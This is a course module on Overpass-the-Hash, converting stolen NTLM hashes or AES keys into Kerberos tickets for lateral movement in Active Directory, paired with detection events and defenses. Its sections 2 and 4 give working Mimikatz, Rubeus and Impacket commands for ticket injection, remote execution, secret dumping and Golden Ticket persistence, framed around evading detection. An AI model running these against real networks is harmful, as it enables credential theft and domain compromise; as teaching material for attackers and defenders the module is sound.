# Overpass-the-Hash

## Unit 6 - Topic 6 | Lateral Movement

---

## Overview

**Overpass-the-Hash** (also called Pass-the-Key) converts an NTLM hash into a Kerberos TGT, enabling lateral movement via Kerberos instead of NTLM. This is stealthier because many detection tools focus on NTLM-based attacks, while Kerberos authentication appears more legitimate.

---

## 1. How Overpass-the-Hash Works

```
NORMAL AUTHENTICATION:
User → Password → NTLM Hash → NTLM Auth to service

PASS-THE-HASH:
Attacker → Stolen NTLM Hash → NTLM Auth to service
(Detected: NTLM auth from unusual source)

OVERPASS-THE-HASH:
Attacker → Stolen NTLM Hash → Request TGT from KDC
                              ← TGT received
                              → Use TGT for Kerberos auth
(Harder to detect: Looks like normal Kerberos!)

FLOW:
┌──────────┐   AS-REQ (encrypted with NTLM hash)   ┌──────┐
│ Attacker │ ────────────────────────────────────→  │  KDC │
│          │   AS-REP (TGT)                         │  (DC)│
│          │ ←──────────────────────────────────── │      │
│          │                                        │      │
│          │   TGS-REQ (with TGT)                   │      │
│          │ ────────────────────────────────────→  │      │
│          │   TGS-REP (service ticket)             │      │
│          │ ←──────────────────────────────────── │      │
│          │                                        └──────┘
│          │   Service request (with TGS)           ┌──────┐
│          │ ────────────────────────────────────→  │Target│
└──────────┘                                        └──────┘
```

---

## 2. Performing Overpass-the-Hash

```bash
# === MIMIKATZ (Windows) ===
# Convert NTLM hash to Kerberos TGT:
sekurlsa::pth /user:admin /domain:corp.local \
  /ntlm:NTLM_HASH /run:cmd.exe
# Opens new cmd.exe with Kerberos ticket injected
# The new process will use Kerberos auth!

# With AES key (more sophisticated):
sekurlsa::pth /user:admin /domain:corp.local \
  /aes256:AES256_KEY /run:powershell.exe
# AES keys are stealthier than NTLM hashes

# Verify ticket:
klist
# Should show TGT for admin@CORP.LOCAL

# Access resources (uses Kerberos):
dir \\dc01.corp.local\c$
net use \\dc01.corp.local\c$

# === RUBEUS (Windows — Preferred) ===
# Request TGT with NTLM hash:
.\Rubeus.exe asktgt /user:admin /domain:corp.local \
  /rc4:NTLM_HASH /ptt
# /ptt: Pass the ticket (inject immediately)

# With AES key:
.\Rubeus.exe asktgt /user:admin /domain:corp.local \
  /aes256:AES256_KEY /ptt /opsec
# /opsec: Use safer encryption options

# Request TGT and save to file:
.\Rubeus.exe asktgt /user:admin /domain:corp.local \
  /rc4:NTLM_HASH /outfile:admin.kirbi

# === IMPACKET (Linux) ===
# Get TGT with hash:
getTGT.py corp.local/admin -hashes :NTLM_HASH -dc-ip dc01
# Output: admin.ccache

# Set ticket for use:
export KRB5CCNAME=admin.ccache

# Use Kerberos auth with any Impacket tool:
psexec.py corp.local/admin@dc01 -k -no-pass
wmiexec.py corp.local/admin@dc01 -k -no-pass
secretsdump.py corp.local/admin@dc01 -k -no-pass
smbclient.py corp.local/admin@dc01 -k -no-pass
```

---

## 3. Why Overpass-the-Hash is Stealthier

```
DETECTION COMPARISON:

PASS-THE-HASH (NTLM):
├── Event 4624: Logon Type 3, Package = NTLM
├── Event 4624: Source shows unusual workstation
├── NTLM auth from non-standard source
├── Many EDR/SIEM rules detect this
└── Detection: 🔴 Moderate-High

OVERPASS-THE-HASH (Kerberos):
├── Event 4768: TGT request (normal Kerberos)
├── Event 4769: TGS request (normal Kerberos)
├── Event 4624: Logon Type 3, Package = Kerberos
├── Looks like legitimate Kerberos auth
├── Fewer detection rules for this pattern
└── Detection: 🟢 Low

WHAT TO LOOK FOR (Defenders):
├── 4768 with RC4 encryption (etype 23)
│   → Normal systems prefer AES (etype 17/18)
│   → RC4 TGT request = possible OpTH!
├── TGT request from unusual source IP
│   → User normally authenticates from workstation X
│   → TGT request from workstation Y = suspicious
└── Mismatched logon patterns
    → User authenticates at unusual time/location
```

---

## 4. Advanced Overpass-the-Hash

```bash
# === WITH AES KEYS (Stealthiest) ===
# AES keys are not as commonly detected
# Get AES keys with Mimikatz:
sekurlsa::ekeys
# Output includes:
# aes256_hmac: 2b576acbe6bcfda7294d6732572...
# aes128_hmac: 9f5abc8a3ef6...

# Use AES-256 key:
.\Rubeus.exe asktgt /user:admin /domain:corp.local \
  /aes256:AES256_KEY /ptt /opsec

# Impacket with AES:
getTGT.py corp.local/admin -aesKey AES256_KEY -dc-ip dc01

# === CROSS-DOMAIN OVERPASS-THE-HASH ===
# Request TGT for user in different domain:
.\Rubeus.exe asktgt /user:admin /domain:dev.corp.local \
  /rc4:HASH /dc:dc01.dev.corp.local /ptt

# === OVERPASS-THE-HASH + GOLDEN TICKET ===
# Step 1: OpTH to get initial access
# Step 2: DCSync for krbtgt hash
# Step 3: Create Golden Ticket
# Step 4: Persistent domain access!

# === PASS-THE-KEY WITH CERTIFICATE ===
# If you have a user's certificate:
.\Rubeus.exe asktgt /user:admin /certificate:cert.pfx /ptt
# Uses PKINIT (certificate-based Kerberos auth)
# Even stealthier than hash-based OpTH
```

---

## 5. Defense

| Defense | Implementation |
|---------|---------------|
| **Monitor etype** | Alert on RC4 TGT requests (Event 4768, etype 23) |
| **AES everywhere** | Disable RC4 via GPO (if compatible) |
| **Credential Guard** | Prevents hash extraction from LSASS |
| **Protected Users** | Members can't use NTLM, only Kerberos with AES |
| **Source IP tracking** | Detect TGT requests from unusual sources |
| **SIEM correlation** | Match 4768 events with user's normal patterns |

---

## Summary Table

| Concept | Key Point |
|---------|-----------|
| **Overpass-the-Hash** | NTLM hash → Kerberos TGT → Kerberos auth |
| **Advantage** | Looks like normal Kerberos (stealthier) |
| **Mimikatz** | `sekurlsa::pth /ntlm:HASH /run:cmd` |
| **Rubeus** | `asktgt /rc4:HASH /ptt` |
| **Impacket** | `getTGT.py` + `export KRB5CCNAME` |
| **AES keys** | Even stealthier than NTLM-based OpTH |
| **Detection** | RC4 TGT requests from unusual sources |

---

## Quick Revision Questions

1. **How does overpass-the-hash differ from pass-the-hash?**
2. **Why is Kerberos-based auth harder to detect than NTLM?**
3. **What encryption type indicates possible overpass-the-hash?**
4. **How do AES keys make overpass-the-hash stealthier?**
5. **What Windows feature prevents NTLM hash extraction?**

---

[← Previous: RDP Hijacking](05-rdp-hijacking.md)

---

*Unit 6 - Topic 6 of 6 | [Back to README](../README.md) | [Next Unit: Persistence →](../07-Persistence/01-user-account-persistence.md)*
